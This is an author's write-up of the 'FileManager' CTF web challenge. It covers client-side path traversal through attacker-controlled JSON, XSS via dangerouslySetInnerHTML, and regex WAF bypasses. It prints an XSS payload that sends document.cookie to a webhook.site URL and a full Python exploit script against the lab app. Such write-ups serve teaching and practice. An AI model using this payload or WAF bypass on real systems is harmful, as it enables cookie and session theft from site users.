# FileManager CTF Challenge Writeup

**Challenge:** FileManager  
**Event:** Cybears CTF 
**Category:** Web
**Difficulty:** Hard

I created this challenge for Cybears CTF, a Capture The Flag competition focused on the Africa region. The event brought together many talented teams from across the continent, making it an exciting competition with high-quality participation.

This was a web challenge that required chaining multiple vulnerabilities to steal the admin's flag cookie.

---

## TL;DR

This challenge chains three vulnerabilities to steal the flag:
1. **Client-Side Path Traversal (CSPT)** - Double URL decoding forces the bot to visit unintended URLs containing XSS payloads
2. **XSS via dangerouslySetInnerHTML** - Next.js frontend renders API response messages without sanitization
3. **Cookie Exfiltration** - Admin bot has flag in cookie, XSS steals it

---

## Overview

**FileManager** is a web application with two main components:
1. **Flask Backend** (Python, port 5000) - REST API with file management and authentication
2. **Next.js Frontend** (React/TypeScript, port 3000) - Client-side application  
3. **Admin Bot** (Playwright) - Simulates admin user visiting reported URLs with flag cookie

---

## Application Architecture

### Flask Backend (Port 5000)

The backend provides several key endpoints across multiple blueprints:

#### Authentication Routes (`/api/auth/`)
- `POST /api/auth/register` - User registration
- `POST /api/auth/login` - User authentication (creates session cookie)
- `POST /api/auth/logout` - Clear user session

#### File Management Routes (`/api/`)
- `POST /api/files` - Create a new file with WAF-protected content (returns filename ID and message)
- `GET /api/files` - List all files belonging to authenticated user
- `GET /api/files/details/<filename>` - Get file details (filename and content)
  - Admin can access any file
  - Regular users only see their own files
- `GET /api/files/content/<filename>` - Get file content as parsed JSON (remember this will get back to it later)
  - Admin can access any file's content 
  - Regular users only see their own files
  - Returns `{'message': 'File not found'}` if file doesn't exist
- `POST /api/files/<filename>` - Update visit counter for a file (returns message)
- `DELETE /api/files/<filename>` - Delete a file (returns message)

#### Admin Routes (`/api/`)
- `POST /api/admin_debug?query=` - Debug endpoint that echoes query parameter
  - Requires authentication
  - Returns `{'filename': ..., 'message': query_param}`
  - **Key vulnerability**: Reflects query parameter directly in message field

#### Bot Trigger (`/api/`)
- `POST /api/report` - Trigger admin bot to visit a URL
  - Validates URL domain matches BASE_DOMAIN
  - Bot visits with admin session and flag cookie

#### The Key Backend Behavior

Multiple endpoints return responses with a `message` field. Understanding which endpoints return messages is crucial for the exploit:

**Endpoints that return a `message` field:**
- `POST /api/files` - Returns `{'message': 'File created successfully', 'name': filename}`
- `POST /api/files/<filename>` - Returns `{'message': 'File visits updated successfully'}`
- `DELETE /api/files/<filename>` - Returns `{'message': 'File deleted successfully'}`
- `GET /api/files/content/<filename>` - Returns `{'message': 'File not found'}` on error
- `POST /api/admin_debug?query=` - Returns `{'filename': ..., 'message': query_param}`

The `/api/admin_debug` endpoint is particularly interesting because it directly reflects the query parameter. In `backend/blueprints/admin.py`:

```python
@admin_bp.route('/admin_debug', methods=['POST'])
def get_all_files():
    query_param = request.args.get('query')
    if 'user_id' not in session:
        return jsonify({'message': 'Unauthorized'}), 401
    
    # if not session.get('admin'):
    #     return jsonify({'message': 'Only Admin can do this'}), 403

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT filename FROM files WHERE content LIKE ?", (f'%{query_param}%',))
        file = cursor.fetchone()

    if file is None:
        return jsonify({'message': 'File not found'}), 404

    return jsonify({'filename': file['filename'], 'message': query_param})
```

The endpoint returns a `message` field with the query parameter. This isn't inherently dangerous on the backend, but becomes exploitable when the frontend renders these messages unsafely.

#### The WAF Implementation

File creation is protected by a WAF that filters XSS attempts:

```python
def waf(input):
    """waf to filter for xss"""
    input = unquote_plus(input)
    input = input.lower()
    pattern = re.compile(
        r'(?:\b[a-zA-Z_]\w*[\s\/\\]*\()|'  # Function calls with parentheses
        r'(?:<\s*[a-zA-Z]+(?:\s|>))|'      # HTML opening tags
        r'(?:<[^>]*\s[^>]*>)',             # HTML tags with attributes
        re.I
    )
    return pattern.search(input)
```

This WAF blocks common XSS patterns in file content, but it doesn't protect query parameters in URLs like those sent to `/api/admin_debug`.

#### Interesting Finding: JSON Parsing Endpoint

During code review, I noticed something interesting in the `/api/files/content/<filename>` endpoint:

```python
@file_bp.route('/files/content/<string:filename>', methods=['GET'])
def get_file_content(filename):
    # ... authentication checks ...
    
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT content FROM files WHERE filename = ?", (filename,))
        file = cursor.fetchone()

    if file is None:
        return jsonify({'message': 'File not found'}), 404
    
    return jsonify(json.loads(file['content']))  # Loads JSON and returns it
```

Unlike other endpoints that return the content as a string, this endpoint **parses the stored content as JSON** and returns the parsed object. This means:
- If we store valid JSON in a file, the endpoint will parse it
- The response structure depends on what JSON we stored
- We could potentially store `{"message": "our content"}` and it would be returned as-is

This behavior becomes relevant later when we explore the full exploit chain. Keep this in mind!

### Next.js Frontend (Port 3000)

The frontend has a critical XSS vulnerability in `/app/files/[id]/page.tsx`. Looking at the compiled JavaScript from the production build (`build/_next/static/chunks/28348a5861dc924c.js`):

```javascript
function n({params: e}) {
    let [n, r] = (0, i.useState)(""), l = async () => {
        try {
            let t, i, n, {id: l} = await e,
                a = decodeURIComponent(l),
                o = await s.fileService.getFile(a);
            "object" != typeof o ? (t = (n = JSON.parse(o)).content, i = n.filename) : (t = o.content, i = o.filename);
            let c = await s.fileService.updateVisits(i, t);
            r(c.message)
        } catch (e) {
            console.error("Failed to fetch files", e)
        }
    };
    return (0, i.useEffect)(() => {
        l()
    }), (0, t.jsxs)("div", {
        className: "container mx-auto p-4",
        children: [(0, t.jsx)("h1", {
            className: "text-2xl font-bold mb-4",
            children: "File Manager"
        }), (0, t.jsx)("h2", {
            children: "Here is the filename"
        }), (0, t.jsx)("br", {}), (0, t.jsx)("div", {
            dangerouslySetInnerHTML: {
                __html: n  // The successMessage variable (minified as 'n')
            }
        }), /* ... more JSX ... */]
    })
}
```

**The vulnerability**: The message from the API response is rendered using `dangerouslySetInnerHTML` without any sanitization! The variable `n` contains the message and gets directly rendered as HTML.

### Admin Bot

From `backend/blueprints/report.py`:

```python
@report_bp.route('/report', methods=['POST'])
def report():
    if 'user_id' not in session:
        return jsonify({'message': 'Unauthorized'}), 401
    
    url = request.form.get('url', '')
    base_domain = os.environ.get('BASE_DOMAIN', '127.0.0.1')
    reported_domain = urlparse(url).hostname

    if reported_domain != base_domain:
        return jsonify({'message': "Invalid URL - Domain does not match"}), 400
    
    # ... admin login ...
    
    flag_cookie = {
        'name': 'flag',
        'value': os.environ['FLAG'],
        'domain': urlparse(url_for('report.report', _external=True)).hostname,
        'path': '/',
        'httpOnly': False,
        'secure': False,
        'sameSite': 'Strict'
    }
    
    context.add_cookies([cookie, flag_cookie])
    page.goto(url, wait_until="networkidle")
    # ...
```

The bot visits our URL with the flag stored in a cookie!

---

## The Path to the Flag

### Discovery #1: The XSS Sink

First, I noticed the Next.js frontend was using `dangerouslySetInnerHTML` to render the `successMessage`. This is a known XSS sink if we can control that value.

The `successMessage` comes from the backend API response's `message` field. Any API endpoint that returns a `message` field will have that content rendered as raw HTML. So if we can make the bot visit a URL that returns our XSS payload in a message field, we win.

### Discovery #2: Finding URLs That Return Our Payload

Now I need to find a URL that will return my XSS payload in a `message` field. Looking through the backend, I found `/api/admin_debug?query=` which echoes the query parameter:

```python
return jsonify({'filename': file['filename'], 'message': query_param})
```

So if the bot visits `/api/admin_debug?query=<img src=x onerror=alert()>`, the API returns `{message: "<img src=x onerror=alert()>"}`, and the frontend will render it as HTML. But the bot only visits URLs we report to it - can we make it visit this API URL instead of a normal page?

### Discovery #3: Client-Side Path Traversal (CSPT) - Making the Bot Visit Unintended URLs

Here's where it gets interesting. Looking at the minified frontend code:

```javascript
l = async () => {
    try {
        let t, i, n, {id: l} = await e,
            a = decodeURIComponent(l),
            o = await s.fileService.getFile(a);
        "object" != typeof o ? (t = (n = JSON.parse(o)).content, i = n.filename) : (t = o.content, i = o.filename);
        let c = await s.fileService.updateVisits(i, t);
        r(c.message)
    } catch (e) {
        console.error("Failed to fetch files", e)
    }
};
```

Breaking down the minified variables:
- `l` = file ID from URL params
- `a` = decoded ID: `decodeURIComponent(l)`
- `o` = response from `getFile(a)`
- `n` = parsed JSON object
- `i` = filename extracted from JSON: `n.filename`
- `t` = content extracted from JSON: `n.content`
- `c` = response from `updateVisits(i, t)`
- `r(c.message)` = sets the message state

Notice the crucial detail: **the frontend extracts a `filename` field from the JSON response, then uses it in a second API call**. This `filename` can be any string - including a path traversal!

#### Understanding the Three-Piece Puzzle

This CSPT vulnerability relies on three interconnected pieces:

**Piece 1: The JSON Parsing Endpoint**

Remember that interesting endpoint we noted earlier?

```python
@file_bp.route('/files/content/<string:filename>', methods=['GET'])
def get_file_content(filename):
    # ...
    return jsonify(json.loads(file['content']))  # Parses stored content as JSON!
```

This is critical because it means **we control the entire response structure**. Whatever JSON we store in the file content will be parsed and returned as-is.

**Piece 2: The Frontend Trust**

```javascript
"object" != typeof o ? (t = (n = JSON.parse(o)).content, i = n.filename) : (t = o.content, i = o.filename);
```

The frontend blindly trusts the `filename` field from the API response:
- Fetches our file from `/api/files/content/{fileId}`
- Receives our controlled JSON: `{"filename": "../../api/admin_debug?query=<XSS>", "content": "..."}`
- Extracts: `i = n.filename` **← We control this!**
- No validation that `i` is actually a filename and not a path traversal!

**Piece 3: The Unsafe Usage & Message Rendering**

```javascript
let c = await s.fileService.updateVisits(i, t);  // Uses our malicious path!
r(c.message)  // Sets state with the response message
```

Then later:
```javascript
(0, t.jsx)("div", {
    dangerouslySetInnerHTML: {
        __html: n  // Renders the message as HTML!
    }
})
```

The frontend uses our controlled `filename` value to construct an API request, then renders the response's `message` field as raw HTML using `dangerouslySetInnerHTML`.

#### The Full Exploit Chain

1. Create a file with JSON: `{"filename": "../../api/admin_debug?query=<XSS>", "content": "..."}`
2. Report URL: `http://frontend/files/{fileId}`
3. Frontend calls `getFile(a)` which fetches `/api/files/content/{fileId}`
4. Backend returns our JSON (Piece 1: JSON parsing endpoint)
5. Frontend parses JSON: `i = n.filename` → `i = "../../api/admin_debug?query=<XSS>"` (Piece 2: Trusting JSON)
6. Frontend calls `updateVisits(i, t)` which requests `/api/files/../../api/admin_debug?query=<XSS>`
7. Path resolves to `/api/admin_debug?query=<XSS>` - **unintended URL!**
8. `/admin_debug` returns `{message: "<XSS>"}` - query parameter echoed in message field
9. Frontend calls `r(c.message)` which sets the state
10. Message rendered with `dangerouslySetInnerHTML` → **XSS executes!** (Piece 3: Unsafe rendering)

**The key insight**: We inject a malicious path into JSON → Frontend trusts the JSON without validation → Frontend makes request to our malicious path → Response message contains XSS → Unsafe rendering executes the XSS!


### Discovery #4: Bypassing the WAF to Store Malicious JSON

There's a WAF on the file creation endpoint:

```python
def waf(input):
    """waf to filter for xss"""
    input = unquote_plus(input)
    input = input.lower()
    pattern = re.compile(
        r'(?:\b[a-zA-Z_]\w*[\s\/\\]*\()|'  # Function calls with parentheses
        r'(?:<\s*[a-zA-Z]+(?:\s|>))|'      # HTML opening tags
        r'(?:<[^>]*\s[^>]*>)',             # HTML tags with attributes
        re.I
    )
    return pattern.search(input)
```

We need to store JSON like `{"filename": "../../api/admin_debug?query=<img src=x onerror=...>", "content": "..."}` but the WAF is designed to block XSS patterns. Let's analyze each regex pattern:

1. `(?:\b[a-zA-Z_]\w*[\s\/\\]*\()` - Detects function calls like `alert(`, `fetch(`, `onerror(`
2. `(?:<\s*[a-zA-Z]+(?:\s|>))` - Detects HTML tags like `<img `, `<script>`
3. `(?:<[^>]*\s[^>]*>)` - Detects HTML tags with attributes like `<img src=x>`

**The WAF bypass techniques:**

There are countless techniques to bypass WAFs, but this challenge wasn't designed to be impossible - my goal was to showcase an interesting technique I discovered during a real-world bug bounty hunting scenario. The WAF was intentionally crafted to be bypassable with creative thinking rather than brute force.

Here are the techniques used in my intended solution:

#### Technique 1: Slash Before Attribute Name

Instead of `<img src='x'>`, use `<img/src='x'>`. The slash makes it bypass pattern #3 because:
- Pattern #3 looks for: `<` + any chars + **space** + any chars + `>`
- Our payload: `<img/src='a'>` has a `/` before the attribute, not a space
- Result: Doesn't match as "HTML tag with attributes"

This is a relatively straightforward bypass, but it's effective against regex patterns that expect standard HTML formatting.

#### Technique 2: Optional Chaining for Function Calls

Instead of `onerror=fetch(...)` which matches pattern #1 (function call with parentheses), use:
```javascript
onerror=fetch?.(`...`)
```

The optional chaining operator `?.` breaks the pattern because:
- Pattern #1 expects: word characters + optional whitespace/slashes + `(`
- Our payload: `fetch?.(` has `?` and `.` between the function name and `(`
- The regex doesn't expect modern JavaScript syntax like optional chaining!

I originally used this technique during bug bounty hunting in a collaboration with a friend and wrote about it here:  
**https://f0dh1l.github.io/blog/posts/first-h1-bounty/**

#### Alternative Solutions from Players

For the record, technique #1 is fairly trivial, but technique #2 (optional chaining) is not really. Most players who solved the challenge used alternative approaches:

- **Bracket notation** instead of dot notation to access objects (e.g., `window['fetch']`)
- **Reflect API** to invoke functions dynamically: `Reflect.get(window, 'fetch')`  
  Read more: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect

These creative solutions highlight that WAF bypasses often have multiple valid approaches, each exploiting different aspects of how the filter is verifying JavaScript syntax and also its a proof that javascript is the weirdest language on earth.

**My final payload:**

```html
<img/src='a'onerror=fetch?.(`https://webhook.site/YOUR-ID?q=${document.cookie}`)>
```

Breaking it down:
- `<img/src='a'>` - Slash before `src` avoids pattern #3
- `onerror=` - Event handler
- `fetch?.(` - Optional chaining avoids pattern #1 (function call detection)
- Template literal with `${...}` for the cookie theft

This payload cleverly bypasses the WAF without any URL encoding - just by using modern JavaScript syntax and strategic formatting!

---

## Building the Exploit

### Step 1: Create a File with Malicious JSON

We need to create a file containing JSON with a malicious `filename` field:

```python
import json

# Our XSS payload in the query parameter
xss_payload = "<img/src='a'onerror=fetch?.(`https://webhook.site/YOUR-ID?q=${document.cookie}`)>"

# The malicious path that will be used by the frontend
malicious_path = f"../../api/admin_debug?query={xss_payload}"

# Create JSON that will be parsed by the frontend
malicious_json = json.dumps({
    "filename": malicious_path,
    "content": "dummy data"
})

# Store it as a file
response = session.post(f"{BASE_URL}/api/files", json={'content': malicious_json})
file_id = response.json().get("name")
```

The key: we're storing a JSON string that contains our malicious path in the `filename` field. When the frontend fetches this file, it will parse the JSON and use that filename in subsequent API calls!

### Step 2: Report the File URL to the Bot

Now we simply report the file URL to the bot:

```python
# Just point to our file - no path traversal in the URL itself!
malicious_url = f"{front_end_url}/files/{file_id}"
```

That's it! The path traversal is **inside the file content**, not in the URL we report. When the bot visits:

1. Frontend loads `/files/{file_id}` page
2. Frontend fetches `/api/files/content/{file_id}`
3. Backend returns our JSON: `{"filename": "../../api/admin_debug?query=<XSS>", "content": "..."}`
4. Frontend parses JSON and extracts `filename`
5. Frontend calls `updateVisits("../../api/admin_debug?query=<XSS>", content)`
6. This makes a request to `/api/files/../../api/admin_debug?query=<XSS>`
7. Path resolves to `/api/admin_debug?query=<XSS>`
8. API returns `{message: "<XSS>"}`
9. Frontend renders it with `dangerouslySetInnerHTML` → XSS executes!

### Step 3: The Full Exploit

```python
import requests
import json

BASE_URL = "http://127.0.0.1:5000"
front_end_url = "http://127.0.0.1:3000"

session = requests.Session()

# 1. Register and login
session.post(f"{BASE_URL}/api/auth/register", json={
    "username": "attacker",
    "password": "password123"
})
session.post(f"{BASE_URL}/api/auth/login", json={
    "username": "attacker", 
    "password": "password123"
})

# 2. Create file with JSON containing malicious filename
xss_payload = "<img/src='a'onerror=fetch?.(`https://webhook.site/YOUR-ID?q=${document.cookie}`)>"
malicious_path = f"../../api/admin_debug?query={xss_payload}"

malicious_json = json.dumps({
    "filename": malicious_path,
    "content": "dummy"
})

response = session.post(f"{BASE_URL}/api/files", json={'content': malicious_json})
file_id = response.json().get("name")

# 3. Report the file URL to the bot
malicious_url = f"{front_end_url}/files/{file_id}"
session.post(f'{BASE_URL}/api/report', data={'url': malicious_url})

# 4. Check webhook for flag!
```

### And by that u get the flag 
**Cybears{CSPT_AND_XSS_LIKE_A_PRO!!!}**
